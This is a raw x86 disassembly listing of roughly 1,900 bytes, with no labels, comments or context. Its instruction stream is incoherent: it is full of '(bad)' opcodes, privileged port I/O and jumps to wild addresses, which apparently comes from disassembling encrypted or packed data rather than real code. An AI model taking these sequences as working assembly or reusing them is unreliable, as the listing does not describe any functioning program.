  41e701:	mov    edi,0xb8a2292
  41e706:	out    0xbf,eax
  41e708:	and    ah,al
  41e70a:	test   eax,0x5db86d13
  41e70f:	or     esi,DWORD PTR ss:[edi+edi*2+0x12]
  41e714:	mov    DWORD PTR [edi],ebp
  41e716:	jb     0x41e754
  41e718:	pop    ss
  41e719:	sbb    eax,0x7d347b3f
  41e71e:	fiadd  WORD PTR [eax-0x449ff360]
  41e724:	sbb    eax,ecx
  41e726:	dec    eax
  41e727:	push   ecx
  41e728:	inc    ebp
  41e729:	scas   al,BYTE PTR es:[edi]
  41e72a:	pop    ecx
  41e72b:	and    ch,BYTE PTR [eax]
  41e72d:	outs   dx,BYTE PTR ds:[esi]
  41e72e:	sar    DWORD PTR [ebx-0x6970eee5],1
  41e734:	test   BYTE PTR [edi+0x1e],cl
  41e737:	add    al,al
  41e739:	sar    BYTE PTR [ecx-0xdc3506e],1
  41e73f:	or     DWORD PTR [ebp+esi*1+0x4444aff3],ecx
  41e746:	inc    edi
  41e747:	sub    eax,0x71e380b5
  41e74c:	icebp  
  41e74d:	jge    0x41e7b7
  41e74f:	xor    al,0x9e
  41e751:	inc    ebx
  41e752:	bound  eax,QWORD PTR [esi-0x4fec0d57]
  41e758:	in     al,0x82
  41e75a:	aaa    
  41e75b:	daa    
  41e75c:	add    al,0xa
  41e75e:	or     edx,DWORD PTR [edi+0x4b57b1b7]
  41e764:	cmc    
  41e765:	jns    0x41e764
  41e767:	push   edx
  41e768:	pusha  
  41e769:	pop    ss
  41e76a:	ins    BYTE PTR es:[edi],dx
  41e76b:	adc    al,0x4e
  41e76d:	add    al,0xf7
  41e76f:	push   esi
  41e770:	push   ds
  41e771:	fsubr  QWORD PTR [edi+0x6f]
  41e774:	mov    ch,0xcc
  41e776:	dec    ebp
  41e777:	pushw  ds
  41e779:	daa    
  41e77a:	cmp    DWORD PTR [ebp+0x5a],esi
  41e77d:	out    dx,eax
  41e77e:	ins    DWORD PTR es:[edi],dx
  41e77f:	cdq    
  41e780:	xchg   DWORD PTR [edi+ebp*8-0x5bdf2bc1],edi
  41e787:	pop    ds
  41e788:	test   BYTE PTR [eax],dh
  41e78a:	push   ebp
  41e78b:	inc    ebp
  41e78c:	jg     0x41e73e
  41e78e:	add    DWORD PTR [ebx+edx*8-0x73],ecx
  41e792:	or     BYTE PTR [edi],bh
  41e794:	sahf   
  41e795:	and    DWORD PTR [eax-0x6],ebx
  41e798:	inc    eax
  41e799:	ss das 
  41e79b:	dec    ebx
  41e79c:	push   0xfa2bf3be
  41e7a1:	xchg   edi,eax
  41e7a2:	mov    DWORD PTR [esi-0x47],edi
  41e7a5:	ins    BYTE PTR es:[edi],dx
  41e7a6:	sbb    BYTE PTR [ebp-0x5fef837e],0x5
  41e7ad:	cmp    edx,DWORD PTR [edi-0x3d]
  41e7b0:	mov    ah,0x88
  41e7b2:	cmc    
  41e7b3:	jp     0x41e7a5
  41e7b5:	add    eax,0xc31313d3
  41e7ba:	push   eax
  41e7bb:	and    eax,0x6cbaa43e
  41e7c0:	xchg   ecx,eax
  41e7c1:	mov    ah,BYTE PTR [ebp-0x7e1982e]
  41e7c7:	push   edi
  41e7c8:	jle    0x41e7bf
  41e7ca:	popf   
  41e7cb:	add    al,0xf2
  41e7cd:	cmp    BYTE PTR [eax+0x2b1a283],0x18
  41e7d4:	(bad)  
  41e7d5:	mov    esi,0x31a95364
  41e7da:	mov    cl,cl
  41e7dc:	(bad)  
  41e7dd:	pop    ds
  41e7de:	lods   eax,DWORD PTR ds:[esi]
  41e7df:	out    0xb9,al
  41e7e1:	aam    0xef
  41e7e3:	jle    0x41e834
  41e7e5:	mov    dl,0x72
  41e7e7:	jp     0x41e865
  41e7e9:	pop    ebp
  41e7ea:	mov    ch,0x96
  41e7ec:	ds fwait
  41e7ee:	scas   al,BYTE PTR es:[edi]
  41e7ef:	adc    eax,0x42d34fbf
  41e7f4:	mov    BYTE PTR fs:[eax],0x9f
  41e7f8:	cmp    DWORD PTR [ebp+eax*8-0x22ece02a],ecx
  41e7ff:	clc    
  41e800:	hlt    
  41e801:	mov    ds:0xf864903,al
  41e806:	daa    
  41e807:	pop    ebx
  41e808:	lods   al,BYTE PTR ds:[esi]
  41e809:	or     ebp,DWORD PTR [edi]
  41e80b:	leave  
  41e80c:	outs   dx,BYTE PTR ds:[esi]
  41e80d:	pop    ds
  41e80e:	xchg   BYTE PTR [ebp+0x55],dh
  41e811:	fisttp DWORD PTR [edi-0x5a]
  41e814:	adc    esp,eax
  41e816:	jno    0x41e868
  41e818:	xor    ah,BYTE PTR es:0x42f8d6de
  41e81f:	cmp    bh,cl
  41e821:	ja     0x41e834
  41e823:	jle    0x41e874
  41e825:	loopne 0x41e861
  41e827:	jno    0x41e831
  41e829:	addr16 cs jmp 0x9db4:0xc541d3cd
  41e832:	std    
  41e833:	sub    ebp,eax
  41e835:	aam    0xd1
  41e837:	mov    dh,0xfc
  41e839:	pop    esp
  41e83a:	cwde   
  41e83b:	pop    ebx
  41e83c:	retf   
  41e83d:	es aas 
  41e83f:	adc    bl,cl
  41e841:	mov    eax,0x7df3d306
  41e846:	or     BYTE PTR [ebx+ebx*8+0x41a37186],bl
  41e84d:	push   ds
  41e84e:	sub    eax,0x1e3c3314
  41e853:	push   es
  41e854:	aad    0x57
  41e856:	and    edx,DWORD PTR [eax-0x3b28cd04]
  41e85c:	add    bh,BYTE PTR [ebx*1+0x1671093f]
  41e863:	jl     0x41e8d3
  41e865:	xor    DWORD PTR [eax],edi
  41e867:	leave  
  41e868:	mov    bh,0x6e
  41e86a:	cmp    al,0x6a
  41e86c:	loope  0x41e832
  41e86e:	push   ds
  41e86f:	mov    ebp,0x36432c65
  41e874:	xchg   edi,eax
  41e875:	in     al,0x53
  41e877:	inc    DWORD PTR [edx+0x78e5944f]
  41e87d:	cld    
  41e87e:	push   ss
  41e87f:	enter  0x9be9,0x7d
  41e883:	imul   BYTE PTR [edx+eiz*2]
  41e886:	dec    esp
  41e887:	fwait
  41e888:	jle    0x41e901
  41e88a:	adc    al,0x9b
  41e88c:	les    eax,FWORD PTR [edx-0x69]
  41e88f:	mov    ds:0x22668177,eax
  41e894:	mov    dl,0x64
  41e896:	mov    ?,edi
  41e898:	inc    BYTE PTR [esi]
  41e89a:	and    eax,0x6aead3d6
  41e89f:	jg     0x41e8e7
  41e8a1:	dec    esp
  41e8a2:	jecxz  0x41e833
  41e8a4:	sub    esp,esi
  41e8a6:	and    DWORD PTR [edi+eax*1-0x40],eax
  41e8aa:	push   edi
  41e8ab:	sti    
  41e8ac:	push   es
  41e8ad:	sbb    eax,0x831654c3
  41e8b2:	out    dx,al
  41e8b3:	sbb    BYTE PTR [ecx+0x4f7f2e87],0xbf
  41e8ba:	loop   0x41e869
  41e8bc:	or     DWORD PTR [ecx],ebp
  41e8be:	push   0x5c
  41e8c0:	test   al,0x53
  41e8c2:	dec    ecx
  41e8c3:	add    BYTE PTR es:[ebp+0x7092a552],ah
  41e8ca:	loopne 0x41e8cf
  41e8cc:	or     DWORD PTR [ecx],edx
  41e8ce:	push   ecx
  41e8cf:	or     edi,0x357384eb
  41e8d5:	and    DWORD PTR [edx+0x8],0x471518da
  41e8dc:	ret    0x27ad
  41e8df:	mov    dh,0xab
  41e8e1:	retf   
  41e8e2:	rol    DWORD PTR [esi],1
  41e8e4:	sbb    edi,esp
  41e8e6:	or     al,0x4e
  41e8e8:	repz xchg esi,eax
  41e8ea:	ss int 0x61
  41e8ed:	mov    eax,0xeefc5e6a
  41e8f2:	cmp    eax,DWORD PTR [ebx-0x5c]
  41e8f5:	mov    dl,0x34
  41e8f7:	js     0x41e974
  41e8f9:	push   ecx
  41e8fa:	lahf   
  41e8fb:	addr16 push esi
  41e8fd:	xchg   DWORD PTR [esp+edi*4-0x5c3e0708],edx
  41e904:	cli    
  41e905:	jo     0x41e95c
  41e907:	jno    0x41e906
  41e909:	pop    edx
  41e90a:	retf   
  41e90b:	mov    cl,0x71
  41e90d:	pop    eax
  41e90e:	shl    DWORD PTR [esi+ecx*2],1
  41e911:	stos   DWORD PTR es:[edi],eax
  41e912:	ins    DWORD PTR es:[edi],dx
  41e913:	sbb    bl,al
  41e915:	sub    BYTE PTR [ecx-0x45281dde],ah
  41e91b:	stc    
  41e91c:	xor    ch,cl
  41e91e:	and    DWORD PTR [eax],eax
  41e920:	fldenv [eax+0x71f1dda4]
  41e926:	cmp    eax,DWORD PTR ds:0x3e07b57d
  41e92c:	arpl   WORD PTR [edi],bp
  41e92e:	push   edi
  41e92f:	xchg   esp,eax
  41e930:	fisttp WORD PTR [ecx]
  41e932:	xor    eax,0x69e4b5b1
  41e937:	pop    ebx
  41e938:	xchg   ecx,eax
  41e939:	cmp    DWORD PTR [edx+edi*8],edi
  41e93c:	or     edi,DWORD PTR [eax+0xd]
  41e93f:	outs   dx,BYTE PTR ds:[esi]
  41e940:	pop    ecx
  41e941:	push   ds
  41e942:	fwait
  41e943:	cmp    eax,ebp
  41e945:	and    al,0x7b
  41e947:	popa   
  41e948:	lea    ecx,[ecx+0x31abdad8]
  41e94e:	pop    ecx
  41e94f:	repnz out dx,al
  41e951:	(bad)  [eax]
  41e953:	adc    eax,0x9a91c1fd
  41e958:	cmp    edi,ebx
  41e95a:	adc    dl,0xee
  41e95d:	ja     0x41e9cc
  41e95f:	clc    
  41e960:	stc    
  41e961:	and    bl,BYTE PTR [edi-0x1e]
  41e964:	jae    0x41e94d
  41e966:	sbb    BYTE PTR [ebp-0x7c],0x79
  41e96a:	add    edx,ecx
  41e96c:	xor    eax,0x1acd8175
  41e971:	(bad)  
  41e972:	stos   DWORD PTR es:[edi],eax
  41e973:	in     eax,0x35
  41e975:	fdiv   QWORD PTR [esp+edx*2+0x1d]
  41e979:	cld    
  41e97a:	mov    ch,0x63
  41e97c:	sbb    esp,DWORD PTR [eax]
  41e97e:	mov    edx,0xe6b17143
  41e983:	pop    edi
  41e984:	mov    al,0x3f
  41e986:	pusha  
  41e987:	sub    DWORD PTR [eax-0x65],eax
  41e98a:	cmp    ch,BYTE PTR [ebx-0x5622ec9a]
  41e990:	cmp    eax,0xb3c4ea41
  41e995:	stos   BYTE PTR es:[edi],al
  41e996:	inc    edi
  41e997:	mov    esp,DWORD PTR [eax-0x4]
  41e99a:	jmp    0x41e949
  41e99c:	jg     0x41e993
  41e99e:	loope  0x41ea00
  41e9a0:	sbb    DWORD PTR [esi],ebp
  41e9a2:	jmp    0x119e104b
  41e9a7:	mov    ds:0x357e4c21,al
  41e9ac:	mov    ecx,0xfe572fe7
  41e9b1:	xchg   edi,eax
  41e9b2:	mov    WORD PTR [ebx+esi*4+0x3dd27e68],es
  41e9b9:	int3   
  41e9ba:	jbe    0x41e953
  41e9bc:	or     BYTE PTR [edi-0x1faded32],bl
  41e9c2:	inc    eax
  41e9c3:	jno    0x41ea21
  41e9c5:	sub    cl,BYTE PTR [esi+edx*2+0x51]
  41e9c9:	dec    ebx
  41e9ca:	pusha  
  41e9cb:	mul    DWORD PTR [edi+edi*2-0x5b]
  41e9cf:	adc    BYTE PTR ds:0x492b912d,0x53
  41e9d6:	mov    eax,0xec129c66
  41e9db:	popa   
  41e9dc:	test   eax,0xbb65e544
  41e9e1:	pop    esp
  41e9e2:	dec    ebp
  41e9e3:	aam    0xbd
  41e9e5:	add    edx,ecx
  41e9e7:	mov    ecx,0x346c16dd
  41e9ec:	pop    ds
  41e9ed:	ja     0x41e9e8
  41e9ef:	(bad)  
  41e9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9f1:	sbb    al,0x8e
  41e9f3:	add    bl,bh
  41e9f5:	jns    0x41ea44
  41e9f7:	mov    edx,0xe42ed514
  41e9fc:	popa   
  41e9fd:	and    ebx,DWORD PTR [ebx+0x762ce161]
  41ea03:	adc    DWORD PTR [eax],esi
  41ea05:	cmp    eax,DWORD PTR [esi-0x170a1bca]
  41ea0b:	inc    esp
  41ea0c:	mov    ds:0xb5bbfc99,eax
  41ea11:	outs   dx,DWORD PTR ds:[esi]
  41ea12:	fdivr  QWORD PTR [esi+ebx*2]
  41ea15:	sbb    BYTE PTR [ebx-0x53],cl
  41ea18:	lods   eax,DWORD PTR ds:[esi]
  41ea19:	add    DWORD PTR [eax-0x61bd05f4],ebx
  41ea1f:	dec    ecx
  41ea20:	je     0x41e9e6
  41ea22:	jb     0x41eaa2
  41ea24:	mov    edi,0x6d007210
  41ea29:	out    0xee,al
  41ea2b:	ficomp WORD PTR [esi]
  41ea2d:	jb     0x41eaa3
  41ea2f:	jge    0x41e9d9
  41ea31:	ret    0x4495
  41ea34:	mov    dh,0x63
  41ea36:	jp     0x41ea80
  41ea38:	push   es
  41ea39:	adc    eax,edx
  41ea3b:	sub    edx,DWORD PTR [ebx]
  41ea3d:	iret   
  41ea3e:	repnz sahf 
  41ea40:	mov    eax,0xa69207ca
  41ea45:	fwait
  41ea46:	ja     0x41e9cd
  41ea48:	xchg   DWORD PTR [edi],edi
  41ea4a:	sub    ebx,eax
  41ea4c:	push   0xffffffb5
  41ea4e:	mov    cl,0xa7
  41ea50:	dec    edi
  41ea51:	mov    eax,0xc333befe
  41ea56:	aam    0x6
  41ea58:	and    al,0xbc
  41ea5a:	test   eax,0x41b2339c
  41ea5f:	repz dec edi
  41ea61:	xchg   edx,eax
  41ea62:	clc    
  41ea63:	push   esi
  41ea64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea65:	cmp    eax,DWORD PTR [edi]
  41ea67:	ret    
  41ea68:	cld    
  41ea69:	iret   
  41ea6a:	out    dx,eax
  41ea6b:	xchg   ecx,eax
  41ea6c:	xchg   DWORD PTR [edi+0x7c418a7],ecx
  41ea72:	aaa    
  41ea73:	mov    ds:0x289172f8,al
  41ea78:	out    dx,al
  41ea79:	adc    al,BYTE PTR [esp+edi*4-0x8d9ad52]
  41ea80:	push   ebx
  41ea81:	inc    esi
  41ea82:	shl    DWORD PTR [eax-0x2b],cl
  41ea85:	es dec esi
  41ea87:	pop    ss
  41ea88:	add    BYTE PTR [ecx+0x3d06da11],bl
  41ea8e:	pop    eax
  41ea8f:	cmp    ebp,DWORD PTR [eax-0x10]
  41ea92:	inc    edi
  41ea93:	jmp    0x8ee9ea0e
  41ea98:	loopne 0x41ea4f
  41ea9a:	lds    ebx,FWORD PTR [eax+0x6d]
  41ea9d:	pop    es
  41ea9e:	add    al,BYTE PTR [edi+0x21]
  41eaa1:	inc    ebp
  41eaa2:	daa    
  41eaa3:	arpl   WORD PTR ds:0x6b14dc9c,dx
  41eaa9:	out    0x14,al
  41eaab:	add    al,0x9f
  41eaad:	or     ebp,DWORD PTR [edi]
  41eaaf:	ror    DWORD PTR [edx],1
  41eab1:	mov    ecx,0x74b05d73
  41eab6:	shl    BYTE PTR [esi],cl
  41eab8:	inc    edi
  41eab9:	icebp  
  41eaba:	jns    0x41ea92
  41eabc:	inc    BYTE PTR [edi+0x3a5f2cdb]
  41eac2:	mov    ch,ah
  41eac4:	scas   eax,DWORD PTR es:[edi]
  41eac5:	jp     0x41eaa8
  41eac7:	xor    BYTE PTR [esi+edi*8+0x3d],0xd8
  41eacc:	push   eax
  41eacd:	push   ecx
  41eace:	pop    es
  41eacf:	outs   dx,DWORD PTR ds:[esi]
  41ead0:	xchg   ecx,eax
  41ead1:	arpl   WORD PTR [ecx],dx
  41ead3:	cmp    al,0x94
  41ead5:	push   ecx
  41ead6:	jecxz  0x41ea5c
  41ead8:	dec    esi
  41ead9:	inc    eax
  41eada:	in     al,dx
  41eadb:	xor    eax,0x147e5727
  41eae0:	mov    al,0x6a
  41eae2:	bound  esi,QWORD PTR [eax-0x4588211d]
  41eae8:	scas   al,BYTE PTR es:[edi]
  41eae9:	jmp    0xd373ac5a
  41eaee:	outs   dx,BYTE PTR ds:[esi]
  41eaef:	cmp    BYTE PTR ss:[eax+0x99b7ac7],ch
  41eaf6:	cmp    esi,esi
  41eaf8:	jle    0x41eaec
  41eafa:	mov    ds:0x67a40162,eax
  41eaff:	xor    al,0x50
  41eb01:	mov    ds:0x8e2d50b1,al
  41eb06:	xchg   BYTE PTR [edi-0x622a3957],dh
  41eb0c:	(bad)  
  41eb0d:	fs jb  0x41eb08
  41eb10:	int    0xfd
  41eb12:	lahf   
  41eb13:	ret    
  41eb14:	xchg   BYTE PTR [ebp+edx*8-0x48731bf6],bh
  41eb1b:	jle    0x41eaff
  41eb1d:	mov    ebx,DWORD PTR [ecx-0x1797075f]
  41eb23:	push   ds
  41eb24:	add    ecx,DWORD PTR [ebx-0x77]
  41eb27:	pop    edx
  41eb28:	push   edi
  41eb29:	mov    ah,0x73
  41eb2b:	jbe    0x41eaf0
  41eb2d:	dec    esp
  41eb2e:	fwait
  41eb2f:	pop    esi
  41eb30:	aas    
  41eb31:	(bad)  
  41eb32:	sar    BYTE PTR [ecx],cl
  41eb34:	mov    esi,0xa0b5fa84
  41eb39:	sbb    bl,BYTE PTR [esi]
  41eb3b:	jl     0x41ead6
  41eb3d:	lea    edx,[ebx]
  41eb3f:	sbb    edi,edi
  41eb41:	sub    eax,0xbca501dd
  41eb46:	mov    dh,0x1e
  41eb48:	inc    eax
  41eb49:	mov    ds:0xbcd915b4,al
  41eb4e:	call   0x5ed1:0x96b0e8ec
  41eb55:	pusha  
  41eb56:	add    DWORD PTR [eax-0x78],esi
  41eb59:	add    BYTE PTR [ebp+edx*1-0x5d],ah
  41eb5d:	lods   eax,DWORD PTR ds:[esi]
  41eb5e:	jle    0x41ebd1
  41eb60:	cmp    edi,DWORD PTR [edx-0x3999e981]
  41eb66:	cmp    edi,0xfffffff6
  41eb69:	into   
  41eb6a:	mov    BYTE PTR [esi+0x20d64727],al
  41eb70:	and    ecx,esi
  41eb72:	addr16 lock repnz retf 
  41eb76:	jl     0x41eb62
  41eb78:	dec    ebx
  41eb79:	nop
  41eb7a:	scas   eax,DWORD PTR es:[edi]
  41eb7b:	imul   esi,DWORD PTR [edi-0x71],0x30
  41eb7f:	inc    esp
  41eb80:	loope  0x41ebe1
  41eb82:	add    al,0x70
  41eb84:	and    ch,BYTE PTR [edx]
  41eb86:	aad    0xdf
  41eb88:	and    ebp,DWORD PTR [edi-0x1c30ae88]
  41eb8e:	mov    ebp,0xc115b871
  41eb93:	jl     0x41eb49
  41eb95:	or     ch,cl
  41eb97:	pop    ds
  41eb98:	push   esp
  41eb99:	cdq    
  41eb9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9b:	xlat   BYTE PTR ds:[ebx]
  41eb9c:	xor    BYTE PTR [edi-0x20],cl
  41eb9f:	ja     0x41ebc8
  41eba1:	push   ebp
  41eba2:	mov    esi,0x1dcb73d7
  41eba7:	dec    ebp
  41eba8:	xchg   edx,eax
  41eba9:	ficom  WORD PTR ds:[esi]
  41ebac:	mov    ?,WORD PTR ds:0x440e19ca
  41ebb2:	cld    
  41ebb3:	cs push ecx
  41ebb5:	push   ebp
  41ebb6:	in     al,0x11
  41ebb8:	ins    DWORD PTR es:[edi],dx
  41ebb9:	push   es
  41ebba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebbb:	dec    ebp
  41ebbc:	mov    dh,0x86
  41ebbe:	(bad)  
  41ebbf:	rol    DWORD PTR ds:0x76cc27c7,1
  41ebc5:	sti    
  41ebc6:	jnp    0x41eb5d
  41ebc8:	inc    esi
  41ebc9:	pop    ebp
  41ebca:	and    edi,ecx
  41ebcc:	sbb    cl,dl
  41ebce:	leave  
  41ebcf:	arpl   WORD PTR ds:0xa3666ea4,bx
  41ebd5:	outs   dx,BYTE PTR gs:[esi]
  41ebd7:	inc    ebp
  41ebd8:	fiadd  WORD PTR [esi-0x1d6f50ef]
  41ebde:	jmp    0x41ec20
  41ebe0:	mov    ds:0x9548dd20,eax
  41ebe5:	aam    0xef
  41ebe7:	pop    es
  41ebe8:	fsub   QWORD PTR [edx]
  41ebea:	cmp    al,0x0
  41ebec:	jl     0x41ebae
  41ebee:	jno    0x41ec1f
  41ebf0:	repz (bad) 
  41ebf2:	cmp    eax,0xe1e2181e
  41ebf7:	or     dl,BYTE PTR [esp+esi*4]
  41ebfa:	pop    edx
  41ebfb:	gs pop ecx
  41ebfd:	out    dx,al
  41ebfe:	pop    esi
  41ebff:	mov    ebp,DWORD PTR [ebx+esi*1-0x6b]
  41ec03:	cs loope 0x41ec37
  41ec06:	and    ebx,DWORD PTR [ebx-0x3b]
  41ec09:	jge    0x41ec68
  41ec0b:	jge    0x41ec6d
  41ec0d:	dec    ecx
  41ec0e:	mov    ds:0x87272706,al
  41ec13:	inc    esp
  41ec14:	pop    ss
  41ec15:	out    0x75,eax
  41ec17:	cdq    
  41ec18:	inc    ebx
  41ec19:	imul   esp,DWORD PTR ds:0x361598e0,0x5e2985a9
  41ec23:	push   ebx
  41ec24:	fcmovu st,st(1)
  41ec26:	xlat   BYTE PTR cs:[ebx]
  41ec28:	aad    0xe8
  41ec2a:	cld    
  41ec2b:	and    eax,0x269b29f6
  41ec30:	xchg   edi,eax
  41ec31:	jmp    0x41ec26
  41ec33:	std    
  41ec34:	dec    eax
  41ec35:	push   ds
  41ec36:	pop    ds
  41ec37:	gs xchg ecx,eax
  41ec39:	jle    0x41ebfd
  41ec3b:	add    ah,cl
  41ec3d:	fmul   DWORD PTR [edi+edi*8+0x9]
  41ec41:	adc    BYTE PTR [ecx-0x963fe8e],dl
  41ec47:	repnz out 0xa3,eax
  41ec4a:	fs je  0x41ec7d
  41ec4d:	xchg   esi,eax
  41ec4e:	loopne 0x41ec3c
  41ec50:	test   DWORD PTR [edi],0x194419c2
  41ec56:	add    al,0x2e
  41ec58:	pop    DWORD PTR [ecx+0x2f]
  41ec5b:	inc    ecx
  41ec5c:	lahf   
  41ec5d:	sbb    ebx,DWORD PTR [edi+esi*8+0x70e3bdfc]
  41ec64:	xor    dh,BYTE PTR [ecx+0x21]
  41ec67:	mov    BYTE PTR [ebx+0x58],dh
  41ec6a:	jmp    0xea5a:0x1af9ea3
  41ec71:	daa    
  41ec72:	dec    ebx
  41ec73:	sbb    eax,0xe848f542
  41ec78:	mov    dl,0x51
  41ec7a:	ret    
  41ec7b:	je     0x41ecdd
  41ec7d:	fsubr  st,st(7)
  41ec7f:	mov    ebp,0x2baf035a
  41ec84:	mov    al,ds:0xceb80fc2
  41ec89:	in     eax,0xf7
  41ec8b:	popa   
  41ec8c:	mov    cl,BYTE PTR [ecx]
  41ec8e:	fidivr DWORD PTR [eax*4-0x3411f11e]
  41ec95:	pushf  
  41ec96:	out    dx,eax
  41ec97:	ret    
  41ec98:	xchg   ebp,eax
  41ec99:	dec    esi
  41ec9a:	arpl   sp,bp
  41ec9c:	mov    eax,0x7443aa6
  41eca1:	data16 fsubr DWORD PTR [edx]
  41eca4:	cld    
  41eca5:	push   edx
  41eca6:	inc    ecx
  41eca7:	aam    0x14
  41eca9:	int3   
  41ecaa:	push   cs
  41ecab:	mov    ecx,0xcc366908
  41ecb0:	jl     0x41eccf
  41ecb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecb3:	les    ebx,FWORD PTR [edi-0x6e]
  41ecb6:	arpl   WORD PTR [ecx],bx
  41ecb8:	lahf   
  41ecb9:	(bad)  
  41ecbd:	(bad)  
  41ecbe:	into   
  41ecbf:	inc    ebp
  41ecc0:	pop    ds
  41ecc1:	xor    eax,0x8272d270
  41ecc6:	call   0x7fc7c9d3
  41eccb:	sub    eax,0xf0fdb45a
  41ecd0:	or     al,0x57
  41ecd2:	pop    ss
  41ecd3:	aam    0x56
  41ecd5:	scas   eax,DWORD PTR es:[edi]
  41ecd6:	test   BYTE PTR [edi-0x6b],bh
  41ecd9:	xchg   ecx,eax
  41ecda:	jo     0x41ed5a
  41ecdc:	das    
  41ecdd:	adc    BYTE PTR [edi],0x91
  41ece0:	fnstenv [esi-0x3b]
  41ece3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece4:	or     BYTE PTR ds:0x53f610c2,0xb7
  41eceb:	bound  eax,QWORD PTR [eax-0x2273e27d]
  41ecf1:	mov    al,ds:0xd2b95358
  41ecf6:	mov    BYTE PTR [edx*1+0x2bb23fc3],0xca
  41ecfe:	and    eax,0x6e085e18
  41ed03:	stos   DWORD PTR es:[edi],eax
  41ed04:	jle    0x41ecec
  41ed06:	pop    es
  41ed07:	jne    0xe103e72f
  41ed0d:	cmp    al,0x77
  41ed0f:	push   es
  41ed10:	jae    0x41ed88
  41ed12:	cmp    eax,0xfb62d318
  41ed17:	and    al,0x2
  41ed19:	or     eax,0x6e75b9ed
  41ed1e:	jge    0x41ece7
  41ed20:	and    DWORD PTR [edx-0x6e96f290],ecx
  41ed26:	or     DWORD PTR [edx],esp
  41ed28:	cmp    al,0x70
  41ed2a:	add    BYTE PTR [edi+0x5c],0x8c
  41ed2e:	mov    ah,0xdf
  41ed30:	inc    ebp
  41ed31:	(bad)  
  41ed32:	fisttp DWORD PTR [esi]
  41ed34:	(bad)
  41ed37:	pop    ds
  41ed38:	xchg   edx,eax
  41ed39:	mov    al,BYTE PTR [ecx]
  41ed3b:	sbb    bl,bh
  41ed3d:	in     eax,0xc9
  41ed3f:	xchg   BYTE PTR [ebp-0x5b921057],dl
  41ed45:	cdq    
  41ed46:	adc    eax,0xaca9fda9
  41ed4b:	aam    0xa3
  41ed4d:	or     BYTE PTR [ecx-0x71],ah
  41ed50:	xlat   BYTE PTR ds:[ebx]
  41ed51:	cmp    DWORD PTR [ecx+0x4f44885f],esp
  41ed57:	push   edx
  41ed58:	sbb    al,0xe2
  41ed5a:	sahf   
  41ed5b:	sbb    esp,DWORD PTR [ebx+0x40adf0a5]
  41ed61:	test   DWORD PTR [ecx+0x14b578f6],ecx
  41ed67:	loope  0x41ed18
  41ed69:	sbb    BYTE PTR [esi],0x7b
  41ed6c:	loope  0x41eda0
  41ed6e:	mov    dh,0x24
  41ed70:	jnp    0x41ed8f
  41ed72:	data16 or ch,0xca
  41ed76:	jb     0x41ed98
  41ed78:	pop    esp
  41ed79:	cmp    BYTE PTR [ecx+0x69de1897],cl
  41ed7f:	pop    es
  41ed80:	or     dh,BYTE PTR [ecx]
  41ed82:	js     0x41ed7d
  41ed84:	dec    ebp
  41ed85:	mov    edx,0x47a9db16
  41ed8a:	ja     0x41ed5c
  41ed8c:	xlat   BYTE PTR ds:[ebx]
  41ed8d:	mov    al,0x18
  41ed8f:	push   ss
  41ed90:	repz xchg ebp,eax
  41ed92:	daa    
  41ed93:	les    ebp,FWORD PTR [esi+0x68]
  41ed96:	sub    edx,DWORD PTR [esi+0x2434000]
  41ed9c:	std    
  41ed9d:	xchg   BYTE PTR [eax-0x1b],cl
  41eda0:	xor    al,bl
  41eda2:	add    DWORD PTR [esi-0x1efb590],ecx
  41eda8:	or     BYTE PTR [esi+0x47],ah
  41edab:	(bad)  
  41edac:	jns    0x41ed47
  41edae:	jp     0x41edbe
  41edb0:	jle    0x41edb6
  41edb2:	mov    cl,0xba
  41edb4:	imul   esi,DWORD PTR [ebx+0x3547bcb4],0x4a
  41edbb:	sar    BYTE PTR [esi+0x6a92ade],1
  41edc1:	dec    esp
  41edc2:	ret    0x4e68
  41edc5:	adc    al,0x73
  41edc7:	fild   QWORD PTR ss:[esi]
  41edca:	int3   
  41edcb:	dec    ecx
  41edcc:	enter  0x75d7,0x40
  41edd0:	or     edx,DWORD PTR [edx+0x42327e47]
  41edd6:	adc    DWORD PTR [edx+0x7cb5e663],esp
  41eddc:	clc    
  41eddd:	sub    BYTE PTR [esi+ebx*2],ah
  41ede0:	mov    eax,0x9d5ff01
  41ede5:	ja     0x41eda0
  41ede7:	cmp    DWORD PTR [ebp+edi*2+0x5d31ba03],ecx
  41edee:	jbe    0x41ee23
  41edf0:	mov    WORD PTR [ecx+0x24],es
  41edf3:	leave  
  41edf4:	lods   al,BYTE PTR ds:[esi]
  41edf5:	cli    
  41edf6:	mov    ah,0x38
  41edf8:	xchg   edi,eax
  41edf9:	bound  edi,QWORD PTR [edi+0x2d]
  41edfc:	cmp    BYTE PTR [ebx],0x89
  41edff:	or     BYTE PTR [edx],bh
  41ee01:	fistp  WORD PTR [ebp+0x52]
  41ee04:	das    
  41ee05:	push   esp
  41ee06:	inc    edi
  41ee07:	lea    esi,[edi-0xf]
  41ee0a:	sbb    eax,0x4df28756
  41ee0f:	fld    TBYTE PTR [ebp-0x279ee37]
  41ee15:	mov    bl,0xc
  41ee17:	and    eax,0xe0fe640a
  41ee1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee1d:	add    al,0x7b
  41ee1f:	ror    DWORD PTR [esi-0x5f],0xb6
  41ee23:	pop    ecx
  41ee24:	cmp    al,0xdc
  41ee26:	adc    ebp,ecx
  41ee28:	sbb    DWORD PTR [edi-0x2956ece5],eax
  41ee2e:	rcr    bl,cl
  41ee30:	inc    esp
  41ee31:	or     dh,BYTE PTR [ecx-0x4ec2e06d]
  41ee37:	adc    edi,ecx
  41ee39:	jae    0x41ee27
  41ee3b:	lock push eax
  41ee3d:	dec    ecx
  41ee3e:	sbb    al,0x45
  41ee40:	xor    dl,BYTE PTR [esi+ebp*2-0x40e8d7]
  41ee47:	sbb    eax,0x9ac917bd
  41ee4c:	xor    ecx,eax
  41ee4e:	int    0x16
  41ee50:	inc    ebx
  41ee51:	(bad)  
  41ee52:	push   edx
  41ee53:	mov    esp,0x8d79e492
  41ee58:	jae    0x41ee56
  41ee5a:	push   eax
  41ee5b:	fadd   QWORD PTR [ebx-0x569528b4]
  41ee61:	inc    edi
  41ee62:	add    eax,0xd1fd3387
  41ee67:	retf   
  41ee68:	jae    0x41edfd
  41ee6a:	nop
